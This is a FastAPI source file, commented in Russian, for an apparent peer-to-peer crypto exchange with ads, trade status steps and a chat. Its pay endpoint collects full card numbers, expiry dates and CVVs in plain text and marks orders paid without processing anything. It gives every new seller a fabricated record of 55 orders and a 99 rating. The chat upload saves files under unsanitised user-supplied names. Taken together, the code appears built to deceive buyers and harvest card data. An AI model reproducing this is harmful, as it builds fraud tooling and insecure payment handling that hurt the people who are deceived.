from fastapi import FastAPI, Request, Form, UploadFile, File, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from uuid import uuid4
from datetime import datetime, timedelta
import os

app = FastAPI()

# Статика и шаблоны
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# In-memory хранилища
ads = []               # объявления
chats = {}             # ad_id -> list of messages
payments = {}          # ad_id -> payment info
order_status = {}      # ad_id -> status: pending, paid, released, cancelled, disputed
receipts = {}          # ad_id -> bool

@app.get("/", response_class=HTMLResponse)
def market(request: Request):
    return templates.TemplateResponse("market.html", {"request": request, "ads": ads})

@app.get("/create", response_class=HTMLResponse)
def create_form(request: Request):
    return templates.TemplateResponse("create_ad.html", {"request": request})

@app.post("/create")
def create_ad(
    request: Request,
    action: str = Form(...),
    crypto: str = Form(...),
    fiat: str = Form(...),
    rate: float = Form(...),
    amount: float = Form(...),
    min_limit: float = Form(...),
    max_limit: float = Form(...),
    payment_method: str = Form(...),
    comment: str = Form(""),
    full_name: str = Form(...),
    card_number: str = Form(...)
):
    ad_id = str(uuid4())
    ads.append({
        "id": ad_id,
        "action": action,
        "crypto": crypto,
        "fiat": fiat,
        "rate": rate,
        "amount": amount,
        "min_limit": min_limit,
        "max_limit": max_limit,
        "payment_method": payment_method,
        "comment": comment,
        "owner": full_name,
        "card_number": card_number,
        "completed_orders": 55,
        "rating": 99
    })
    # инициализация storages
    chats[ad_id] = []
    payments[ad_id] = {}
    order_status[ad_id] = None
    receipts[ad_id] = False
    return RedirectResponse("/", status_code=302)

@app.get("/trade/{ad_id}", response_class=HTMLResponse)
def trade_view(request: Request, ad_id: str):
    ad = next((a for a in ads if a["id"] == ad_id), None)
    if not ad:
        raise HTTPException(404, "Объявление не найдено")
    # Сброс таймера при каждом заходе (или хранить timestamp)
    remaining = 15 * 60
    return templates.TemplateResponse("trade.html", {
        "request": request,
        "ad": ad,
        "remaining": remaining,
        "messages": chats.get(ad_id, []),
        "order_status": order_status,
    })

@app.post("/trade/{ad_id}/buy")
def trade_buy(ad_id: str, amount: float = Form(...)):
    if ad_id not in order_status:
        raise HTTPException(404, "Объявление не найдено")
    payments[ad_id] = {"amount": amount}
    order_status[ad_id] = "pending"
    return RedirectResponse(f"/trade/{ad_id}", status_code=302)

@app.post("/trade/{ad_id}/pay")
def trade_pay(
    ad_id: str,
    card_number: str = Form(...),
    exp_date: str = Form(...),
    cvv: str = Form(...)
):
    if order_status.get(ad_id) != "pending":
        raise HTTPException(400, "Нельзя оплатить в этом статусе")
    payments[ad_id].update({
        "paid": True,
        "card_number": card_number,
        "exp_date": exp_date,
        "cvv": cvv,
        "timestamp": datetime.utcnow().strftime("%Y.%m.%d %H:%M")
    })
    order_status[ad_id] = "paid"
    return RedirectResponse(f"/trade/{ad_id}", status_code=302)

@app.post("/trade/{ad_id}/confirm_receipt")
def confirm_receipt(ad_id: str):
    if order_status.get(ad_id) != "paid":
        raise HTTPException(400, "Нельзя подтвердить получение в этом статусе")
    order_status[ad_id] = "released"
    receipts[ad_id] = True
    return RedirectResponse(f"/trade/{ad_id}", status_code=302)

@app.post("/trade/{ad_id}/cancel")
def cancel_trade(ad_id: str):
    if order_status.get(ad_id) in ["pending", "disputed"]:
        order_status[ad_id] = "cancelled"
    return RedirectResponse(f"/trade/{ad_id}", status_code=302)

@app.post("/trade/{ad_id}/dispute")
def dispute_trade(ad_id: str):
    if order_status.get(ad_id) == "paid":
        order_status[ad_id] = "disputed"
    return RedirectResponse(f"/trade/{ad_id}", status_code=302)

@app.post("/trade/{ad_id}/message")
async def chat_message(
    ad_id: str,
    message: str = Form(None),
    image: UploadFile = File(None)
):
    if ad_id not in chats:
        raise HTTPException(404, "Объявление не найдено")
    entry = {"user": "Вы", "text": message or ""}
    if image:
        os.makedirs("static/uploads", exist_ok=True)
        path = f"static/uploads/{uuid4().hex}_{image.filename}"
        with open(path, "wb") as f:
            f.write(await image.read())
        entry["image_url"] = path.replace("static", "/static")
    chats[ad_id].append(entry)
    return RedirectResponse(f"/trade/{ad_id}", status_code=302)
